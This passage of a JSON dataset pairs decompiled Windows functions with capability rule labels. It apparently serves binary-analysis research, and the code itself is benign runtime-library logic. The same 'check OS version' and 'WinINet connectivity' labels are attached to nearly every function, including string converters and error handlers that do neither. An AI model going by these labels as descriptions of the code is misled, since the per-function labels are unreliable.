            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0040483c(uint param_1, uint param_2)\n\n{\n    code *UNRECOVERED_JUMPTABLE;\n    uchar in_ZF;\n    \n    fcn.0040480c(param_1);\n    if (!in_ZF) {\n    // WARNING: Could not recover jumptable at 0x00404849. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*UNRECOVERED_JUMPTABLE)();\n        return;\n    }\n    if (*0x49302c != NULL) {\n        (**0x49302c)();\n    }\n    *0x490004 = param_2;\n    *0x490000 = 0xd2;\n    fcn.00405378();\n    return;\n}\n",
        "token_count": 168
    },
    "00404a38": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404a38(uint param_1, uint param_2)\n\n{\n    uint auStack12 [3];\n    \n    if (*0x490028 != '\\0') {\n        auStack12[0] = param_2;\n        (**0x493014)(0xeedfae4, 0, 2, auStack12);\n    }\n    return;\n}\n",
        "token_count": 85
    },
    "004052ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004052ec(void)\n\n{\n    uint uVar1;\n    uint uStack28;\n    uint uStack24;\n    char *pcStack20;\n    char *pcStack16;\n    char *pcStack12;\n    uint uStack8;\n    uchar auStack4 [4];\n    \n    if (*0x49304c != '\\0') {\n        if ((*0x493220 == -0x284e) && (*0x493228 != 0)) {\n            uStack8 = 0x405315;\n            (**0x493238)();\n        }\n        pcStack12 = &stack0xfffffffc;\n        uStack8 = 0;\n        pcStack16 = 0x1e;\n        pcStack20 = \"Runtime error     at 00000000\";\n        uStack24 = 0xfffffff5;\n        uStack28 = 0x40532a;\n        uStack28 = sub.kernel32.dll_GetStdHandle();\n        sub.kernel32.dll_WriteFile();\n        uVar1 = sub.kernel32.dll_GetStdHandle(0xfffffff5, 0x405374, 2, &stack0xffffffe4, 0);\n        sub.kernel32.dll_WriteFile(uVar1);\n        return;\n    }\n    if (*0x490030 == '\\0') {\n        uStack8 = 0;\n        pcStack12 = \"Error\";\n        pcStack16 = \"Runtime error     at 00000000\";\n        pcStack20 = NULL;\n        uStack24 = 0x405369;\n        sub.user32.dll_MessageBoxA();\n    }\n    return;\n}\n",
        "token_count": 341
    },
    "00405378": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00405378(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    \n    if ((*0x4957f0 == 0) && (*0x493048 != NULL)) {\n        do {\n            pcVar1 = *0x493048;\n            *0x493048 = NULL;\n            (*pcVar1)();\n        } while (*0x493048 != NULL);\n    }\n    if (*0x490004 != 0) {\n        fcn.00405258();\n        fcn.004052ec();\n        *0x490004 = 0;\n    }\n    do {\n        if ((*0x4957f0 == 2) && (*0x490000 == 0)) {\n            *0x4957d4 = 0;\n        }\n        fcn.00405100();\n        if (((*0x4957f0 < 2) || (*0x490000 != 0)) && (*0x4957d8 != 0)) {\n            fcn.00407088();\n            iVar2 = *(*0x4957d8 + 0x10);\n            if ((iVar2 != *(*0x4957d8 + 4)) && (iVar2 != 0)) {\n                sub.kernel32.dll_FreeLibrary(iVar2);\n            }\n        }\n        fcn.004050d8();\n        if (*0x4957f0 == 1) {\n            (**0x4957ec)();\n        }\n        if (*0x4957f0 != 0) {\n            fcn.004052bc();\n        }\n        if (*0x4957c8 == NULL) {\n            if (*0x493028 != NULL) {\n                (**0x493028)();\n            }\n            sub.kernel32.dll_ExitProcess(*0x490000);\n        }\n        puVar3 = *0x4957c8;\n        puVar4 = 0x4957c8;\n        for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n    } while( true );\n}\n",
        "token_count": 499
    },
    "00406000": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00406000(void)\n\n{\n    if (*0x490010 != NULL) {\n        (**0x490010)();\n        return;\n    }\n    fcn.00403040();\n    return;\n}\n",
        "token_count": 46
    },
    "00406018": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403014)\n\nvoid __fastcall fcn.00406018(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t iVar3;\n    \n    if (param_1 != 0) {\n        cVar1 = *param_2;\n        if (cVar1 == '\\n') {\n            if (param_1 < 2) {\n                fcn.0040546c();\n            }\n            else {\n                fcn.00405490();\n            }\n        }\n        else if (cVar1 == '\\v') {\n            if (param_1 < 2) {\n                fcn.00405c48();\n            }\n            else {\n                fcn.00405c60();\n            }\n        }\n        else if (cVar1 == '\\f') {\n            do {\n                fcn.00406000();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\r') {\n            do {\n                fcn.00406018();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\x0e') {\n            do {\n                fcn.00405fcc();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\x0f') {\n            do {\n                fcn.004070f8();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else {\n            if (cVar1 != '\\x11') {\n                if (*0x493008 != NULL) {\n                    (**0x493008)();\n                }\n                fcn.00402fe8();\n                return;\n            }\n            do {\n                fcn.00406a20();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 577
    },
    "00406110": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00406110(void)\n\n{\n    if (*0x490018 != NULL) {\n        (**0x490018)();\n        return;\n    }\n    fcn.00403040();\n    return;\n}\n",
        "token_count": 46
    },
    "00406540": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00406540(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t in_ECX;\n    char in_DL;\n    int32_t iVar3;\n    int64_t iVar4;\n    char cStack38;\n    uint var_21h;\n    uint var_1h;\n    \n    iVar3 = 0;\n    var_1h._0_1_ = in_DL;\n    do {\n        iVar2 = iVar3;\n        cVar1 = fcn.004064f0(10, 0);\n        *(&var_21h + iVar2) = cVar1 + '0';\n        iVar3 = iVar2 + 1;\n        iVar4 = fcn.004064a4();\n    } while (iVar4 != 0);\n    if (var_1h != '\\0') {\n        *(&var_21h + iVar2 + 1) = 0x2d;\n        iVar3 = iVar2 + 2;\n    }\n    if (0xff < in_EAX) {\n        in_EAX = 0xff;\n    }\n    iVar2 = 1;\n    if (0 < in_EAX - iVar3) {\n        do {\n            *(in_ECX + iVar2) = 0x20;\n            iVar2 = iVar2 + 1;\n        } while (iVar2 <= in_EAX - iVar3);\n    }\n    for (; 0 < iVar3; iVar3 = iVar3 + -1) {\n        *(in_ECX + iVar2) = (&cStack38)[iVar3];\n        iVar2 = iVar2 + 1;\n    }\n    fcn.004033a8();\n    return;\n}\n",
        "token_count": 409
    },
    "004065e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004065e4(int32_t arg_8h, int32_t arg_ch)\n\n{\n    bool bVar1;\n    \n    if (arg_ch < 0) {\n        bVar1 = arg_8h != 0;\n        arg_8h = -arg_8h;\n        arg_ch = -(arg_ch + bVar1);\n    }\n    fcn.00406540(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 101
    },
    "00406640": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00406724)\n// WARNING: Removing unreachable block (ram,0x00406813)\n// WARNING: Removing unreachable block (ram,0x0040681a)\n// WARNING: Removing unreachable block (ram,0x004067a0)\n// WARNING: Removing unreachable block (ram,0x004067b6)\n// WARNING: Removing unreachable block (ram,0x00406824)\n// WARNING: Removing unreachable block (ram,0x00406827)\n// WARNING: Removing unreachable block (ram,0x0040682d)\n// WARNING: Removing unreachable block (ram,0x004067ac)\n\nulong __fastcall fcn.00406640(uint param_1, int32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    char cVar4;\n    int32_t in_EAX;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    bool bVar9;\n    int32_t *piStack36;\n    uint32_t uStack28;\n    int32_t iStack24;\n    \n    iVar7 = 1;\n    uStack28 = 0;\n    iStack24 = 0;\n    if (in_EAX == 0) {\n        *param_2 = 1;\n        goto code_r0x00406848;\n    }\n    for (; *(in_EAX + -1 + iVar7) == ' '; iVar7 = iVar7 + 1) {\n    }\n    bVar9 = false;\n    cVar4 = *(in_EAX + -1 + iVar7);\n    if (cVar4 == '-') {\n        bVar9 = true;\n        iVar7 = iVar7 + 1;\n    }\n    else if (cVar4 == '+') {\n        iVar7 = iVar7 + 1;\n    }\n    uVar2 = 1;\n    piStack36 = param_2;\n    if (((*(in_EAX + -1 + iVar7) == '$') || (cVar4 = fcn.004033f0(),  cVar4 == 'X')) ||\n       ((*(in_EAX + -1 + iVar7) == '0' && (cVar4 = fcn.004033f0(),  cVar4 == 'X')))) {\n        if (*(in_EAX + -1 + iVar7) == '0') {\n            iVar7 = iVar7 + 1;\n        }\n        do {\n            iVar7 = iVar7 + 1;\n            uVar1 = *(in_EAX + -1 + iVar7);\n            if (uVar1 - 0x30 < 10) {\n                uVar8 = uVar1 - 0x30;\n            }\n            else if (uVar1 + 0xbf < 6) {\n                uVar8 = uVar1 - 0x37;\n            }\n            else {\n                if (5 < uVar1 + 0x9f) goto code_r0x00406756;\n                uVar8 = uVar1 - 0x57;\n            }\n            if (((iStack24 != 0) && (iStack24 < 0)) || ((iStack24 != 0xfffffff && (0xfffffff < iStack24))))\n            goto code_r0x00406756;\n            uVar3 = uStack28 >> 0x1c;\n            uVar5 = uStack28 * 0x10;\n            uStack28 = uVar5 + uVar8;\n            iStack24 = (iStack24 << 4 | uVar3) + (uVar8 >> 0x1f) + CARRY4(uVar5, uVar8);\n            uVar2 = 0;\n        } while( true );\n    }\n    for (; *(in_EAX + -1 + iVar7) - 0x30U < 10; iVar7 = iVar7 + 1) {\n        uVar2 = *(in_EAX + -1 + iVar7);\n        iVar6 = fcn.004063ec();\n        piStack36 = (uVar2 - 0x30) + iVar6;\n        uVar2 = 0;\n    }\n    iStack24 = 0;\n    uStack28 = 0;\n    goto code_r0x0040682e;\ncode_r0x00406756:\n    if (bVar9) {\n        bVar9 = uStack28 != 0;\n        uStack28 = -uStack28;\n        iStack24 = -(iStack24 + bVar9);\n    }\ncode_r0x0040682e:\n    if (uVar2 | *(in_EAX + -1 + iVar7) != '\\0') {\n        *piStack36 = iVar7;\n    }\n    else {\n        *piStack36 = 0;\n    }\ncode_r0x00406848:\n    return CONCAT44(iStack24, uStack28);\n}\n",
        "token_count": 1082
    },
    "00406ab4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00406ab4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uchar auStack272 [264];\n    \n    if (*(in_EAX + 0x10) == 0) {\n        sub.kernel32.dll_GetModuleFileNameA(*(in_EAX + 4), auStack272, 0x105);\n        iVar1 = fcn.00406d18();\n        *(in_EAX + 0x10) = iVar1;\n        if (iVar1 == 0) {\n            *(in_EAX + 0x10) = *(in_EAX + 4);\n        }\n    }\n    return *(in_EAX + 0x10);\n}\n",
        "token_count": 153
    },
    "00406b54": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar * __cdecl\nfcn.00406b54(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint arg_5ch)\n\n{\n    char *in_EAX;\n    code *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    uint in_EDX;\n    uint *puVar6;\n    uint lpFileName;\n    uint lpFindFileData;\n    uint lpString2;\n    int32_t hFindFile;\n    char *var_ch;\n    uint iMaxLength;\n    char *lpString1;\n    \n    var_ch = in_EAX;\n    iMaxLength = in_EDX;\n    lpString1 = in_EAX;\n    hFindFile = sub.kernel32.dll_GetModuleHandleA(0x406cf4);\n    if (((hFindFile == 0) || (pcVar1 = sub.kernel32.dll_GetProcAddress(hFindFile, 0x406d04),  pcVar1 == NULL)) ||\n       (iVar2 = (*pcVar1)(lpString1, &lpFileName, 0x105),  iVar2 == 0)) {\n        if (*lpString1 == '\\\\') {\n            if (lpString1[1] != '\\\\') {\n                return var_ch;\n            }\n            pcVar3 = fcn.00406b34();\n            if (*pcVar3 == '\\0') {\n                return var_ch;\n            }\n            pcVar3 = fcn.00406b34();\n            if (*pcVar3 == '\\0') {\n                return var_ch;\n            }\n        }\n        else {\n            pcVar3 = lpString1 + 2;\n        }\n        iVar2 = pcVar3 - lpString1;\n        puVar6 = &lpFileName;\n        sub.kernel32.dll_lstrcpynA(puVar6, lpString1, iVar2 + 1);\n        while (*pcVar3 != '\\0') {\n            pcVar4 = fcn.00406b34();\n            if (0x105 < pcVar4 + (iVar2 - pcVar3) + 1) {\n                return var_ch;\n            }\n            sub.kernel32.dll_lstrcpynA(&lpFileName + iVar2, pcVar3, pcVar4 + (1 - pcVar3));\n            hFindFile = sub.kernel32.dll_FindFirstFileA(&lpFileName, &lpFindFileData);\n            if (hFindFile == -1) {\n                return var_ch;\n            }\n            sub.kernel32.dll_FindClose(hFindFile);\n            iVar5 = sub.kernel32.dll_lstrlenA(&lpString2);\n            if (0x105 < iVar5 + iVar2 + 2) {\n                return var_ch;\n            }\n            *(&lpFileName + iVar2) = 0x5c;\n            sub.kernel32.dll_lstrcpynA(&lpFileName + iVar2 + 1, &lpString2, 0x104 - iVar2);\n            puVar6 = &lpString2;\n            iVar5 = sub.kernel32.dll_lstrlenA();\n            iVar2 = iVar2 + iVar5 + 1;\n            pcVar3 = pcVar4;\n        }\n        sub.kernel32.dll_lstrcpynA(lpString1, &lpFileName, iMaxLength, puVar6);\n    }\n    else {\n        sub.kernel32.dll_lstrcpynA(lpString1, &lpFileName, iMaxLength);\n    }\n    return var_ch;\n}\n",
        "token_count": 858
    },
    "00406d18": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00406d18(void)\n\n{\n    uint noname_0;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    char *pcVar4;\n    uint unaff_ESI;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffe50;\n    uint in_stack_fffffe8c;\n    uint in_stack_fffffe90;\n    uint in_stack_fffffe94;\n    uint in_stack_fffffe98;\n    uint *in_stack_fffffe9c;\n    uint in_stack_fffffea0;\n    uint in_stack_fffffea4;\n    uint in_stack_fffffea8;\n    uint in_stack_fffffeac;\n    uint *noname_12;\n    uint uVar5;\n    uint noname_14;\n    uint noname_15;\n    uint noname_16;\n    uint noname_18;\n    uint *noname_19;\n    uint noname_20;\n    uint lpLibFileName;\n    uint var_18h;\n    uint var_12h;\n    uint var_eh;\n    uint hKey;\n    uint lpString2;\n    \n    noname_20 = 0x105;\n    noname_19 = &fcn.00406d18::lpLibFileName;\n    noname_18 = 0;\n    sub.kernel32.dll_GetModuleFileNameA();\n    var_12h._0_1_ = '\\0';\n    puVar3 = &fcn.00406d18::hKey;\n    noname_16 = 0xf0019;\n    noname_15 = 0;\n    noname_14 = 0x406f48;\n    uVar5 = 0x80000001;\n    noname_12 = 0x406d57;\n    iVar1 = sub.advapi32.dll_RegOpenKeyExA();\n    if (iVar1 != 0) {\n        noname_12 = &fcn.00406d18::hKey;\n        in_stack_fffffeac = 0xf0019;\n        in_stack_fffffea8 = 0;\n        in_stack_fffffea4 = 0x406f48;\n        in_stack_fffffea0 = 0x80000002;\n        in_stack_fffffe9c = 0x406d75;\n        iVar1 = sub.advapi32.dll_RegOpenKeyExA();\n        if (iVar1 != 0) {\n            in_stack_fffffe9c = &fcn.00406d18::hKey;\n            in_stack_fffffe98 = 0xf0019;\n            in_stack_fffffe94 = 0;\n            in_stack_fffffe90 = 0x406f64;\n            in_stack_fffffe8c = 0x80000001;\n            iVar1 = sub.advapi32.dll_RegOpenKeyExA();\n            if (iVar1 != 0) {\n                sub.kernel32.dll_lstrcpynA();\n                uVar5 = sub.kernel32.dll_GetThreadLocale(3, &fcn.00406d18::var_eh + 1, 5);\n                sub.kernel32.dll_GetLocaleInfoA(uVar5);\n                iVar1 = 0;\n                if ((lpLibFileName != '\\0') && ((var_eh._1_1_ != '\\0' || (var_12h != '\\0')))) {\n                    iVar2 = sub.kernel32.dll_lstrlenA(&fcn.00406d18::lpLibFileName);\n                    for (puVar3 = &fcn.00406d18::lpLibFileName + iVar2;\n                        (*puVar3 != '.' && (puVar3 != &fcn.00406d18::lpLibFileName)); puVar3 = puVar3 + -1) {\n                    }\n                    if (puVar3 != &fcn.00406d18::lpLibFileName) {\n                        pcVar4 = puVar3 + 1;\n                        if (var_12h != '\\0') {\n                            sub.kernel32.dll_lstrcpynA\n                                      (pcVar4, &fcn.00406d18::var_12h, 0x105 - (pcVar4 - &fcn.00406d18::lpLibFileName));\n                            iVar1 = sub.kernel32.dll_LoadLibraryExA(&fcn.00406d18::lpLibFileName, 0, 2);\n                        }\n                        if ((iVar1 == 0) && (var_eh._1_1_ != '\\0')) {\n                            sub.kernel32.dll_lstrcpynA\n                                      (pcVar4, &fcn.00406d18::var_eh + 1, \n                                       0x105 - (pcVar4 - &fcn.00406d18::lpLibFileName));\n                            iVar1 = sub.kernel32.dll_LoadLibraryExA(&fcn.00406d18::lpLibFileName, 0, 2);\n                            if (iVar1 == 0) {\n                                var_eh._3_1_ = 0;\n                                sub.kernel32.dll_lstrcpynA\n                                          (pcVar4, &fcn.00406d18::var_eh + 1, \n                                           0x105 - (pcVar4 - &fcn.00406d18::lpLibFileName));\n                                iVar1 = sub.kernel32.dll_LoadLibraryExA(&fcn.00406d18::lpLibFileName, 0, 2);\n                            }\n                        }\n                    }\n                }\n                return iVar1;\n            }\n        }\n    }\n    noname_0 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe80;\n    var_18h = 5;\n    fcn.00406b54(noname_0, 0x406e1d, &stack0xfffffffc, in_stack_fffffe8c, in_stack_fffffe90, in_stack_fffffe94, \n                 in_stack_fffffe98, in_stack_fffffe9c, in_stack_fffffea0, in_stack_fffffea4, in_stack_fffffea8, \n                 in_stack_fffffeac, noname_12, uVar5, noname_14, noname_15, noname_16, puVar3, noname_18, noname_19, \n                 noname_20, unaff_ESI);\n    iVar1 = sub.advapi32.dll_RegQueryValueExA\n                      (hKey, &fcn.00406d18::lpLibFileName, 0, 0, &fcn.00406d18::var_12h, &fcn.00406d18::var_18h);\n    if (iVar1 != 0) {\n        in_stack_fffffe50 = hKey;\n        iVar1 = sub.advapi32.dll_RegQueryValueExA(hKey, 0x406f84, 0, 0, &fcn.00406d18::var_12h, &fcn.00406d18::var_18h);\n        if (iVar1 != 0) {\n            var_12h._0_1_ = '\\0';\n        }\n    }\n    var_eh._0_1_ = 0;\n    *in_FS_OFFSET = in_stack_fffffe50;\n    iVar1 = sub.advapi32.dll_RegCloseKey(hKey, 0x406e24);\n    return iVar1;\n}\n",
        "token_count": 1589
    },
    "0040701c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040701c(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    var_8h = *0x49003c;\n    if (*0x49003c != NULL) {\n        do {\n            uStack32 = 0x407057;\n            uStack36 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &uStack36;\n            puStack28 = &stack0xfffffffc;\n            (*var_8h[1])();\n            *in_FS_OFFSET = uStack36;\n            var_8h = *var_8h;\n        } while (var_8h != NULL);\n    }\n    return;\n}\n",
        "token_count": 176
    },
    "00407224": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00407224(uint32_t arg_8h)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint32_t in_EDX;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = 0;\n    if (in_ECX != 0) {\n        uVar5 = 0;\n        uVar2 = 0;\n        if (in_EAX == 0) {\n            if (arg_8h != 0) {\n                do {\n                    uVar1 = *(in_ECX + uVar2 * 2);\n                    uVar2 = uVar2 + 1;\n                    if (0x7f < uVar1) {\n                        if (0x7ff < uVar1) {\n                            uVar5 = uVar5 + 1;\n                        }\n                        uVar5 = uVar5 + 1;\n                    }\n                    uVar5 = uVar5 + 1;\n                } while (uVar2 < arg_8h);\n            }\n        }\n        else {\n            while ((uVar2 < arg_8h && (uVar5 < in_EDX))) {\n                uVar1 = *(in_ECX + uVar2 * 2);\n                uVar2 = uVar2 + 1;\n                uVar3 = uVar1;\n                if (uVar1 < 0x80) {\n                    *(in_EAX + uVar5) = uVar3;\n                    uVar5 = uVar5 + 1;\n                }\n                else if (uVar1 < 0x800) {\n                    if (in_EDX < uVar5 + 2) break;\n                    *(in_EAX + uVar5) = uVar1 >> 6 | 0xc0;\n                    *(in_EAX + 1 + uVar5) = uVar3 & 0x3f | 0x80;\n                    uVar5 = uVar5 + 2;\n                }\n                else {\n                    if (in_EDX < uVar5 + 3) break;\n                    *(in_EAX + uVar5) = uVar1 >> 0xc | 0xe0;\n                    *(in_EAX + 1 + uVar5) = uVar1 >> 6 & 0x3f | 0x80;\n                    *(in_EAX + 2 + uVar5) = uVar3 & 0x3f | 0x80;\n                    uVar5 = uVar5 + 3;\n                }\n            }\n            if (in_EDX <= uVar5) {\n                uVar5 = in_EDX - 1;\n            }\n            *(in_EAX + uVar5) = 0;\n        }\n        iVar4 = uVar5 + 1;\n    }\n    return iVar4;\n}\n",
        "token_count": 653
    },
    "00407300": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00407300(uint32_t arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint32_t in_EDX;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (in_ECX == 0) {\n        var_10h = 0;\n    }\n    else {\n        uVar3 = 0;\n        uVar5 = 0;\n        if (in_EAX == 0) {\n            if (arg_8h != 0) {\n                do {\n                    uVar6 = uVar5 + 1;\n                    if ((*(in_ECX + uVar5) & 0x80) != 0) {\n                        if (arg_8h <= uVar6) {\n                            return -1;\n                        }\n                        if ((*(in_ECX + uVar5) & 0x20) != 0) {\n                            puVar1 = in_ECX + uVar6;\n                            uVar6 = uVar5 + 2;\n                            if ((*puVar1 & 0xc0) != 0x80) {\n                                return -1;\n                            }\n                            if (arg_8h <= uVar6) {\n                                return -1;\n                            }\n                        }\n                        puVar1 = in_ECX + uVar6;\n                        uVar6 = uVar6 + 1;\n                        if ((*puVar1 & 0xc0) != 0x80) {\n                            return -1;\n                        }\n                    }\n                    uVar3 = uVar3 + 1;\n                    uVar5 = uVar6;\n                } while (uVar6 < arg_8h);\n            }\n        }\n        else {\n            for (; (uVar5 < arg_8h && (uVar3 < in_EDX)); uVar3 = uVar3 + 1) {\n                uVar2 = *(in_ECX + uVar5);\n                uVar6 = uVar5 + 1;\n                if ((uVar2 & 0x80) == 0) {\n                    *(in_EAX + uVar3 * 2) = uVar2;\n                }\n                else {\n                    if (arg_8h <= uVar6) {\n                        return -1;\n                    }\n                    uVar4 = uVar2 & 0x3f;\n                    if ((uVar2 & 0x20) != 0) {\n                        puVar1 = in_ECX + uVar6;\n                        uVar6 = uVar5 + 2;\n                        if ((*puVar1 & 0xc0) != 0x80) {\n                            return -1;\n                        }\n                        if (arg_8h <= uVar6) {\n                            return -1;\n                        }\n                        uVar4 = *puVar1 & 0x3f | uVar4 << 6;\n                    }\n                    puVar1 = in_ECX + uVar6;\n                    uVar6 = uVar6 + 1;\n                    if 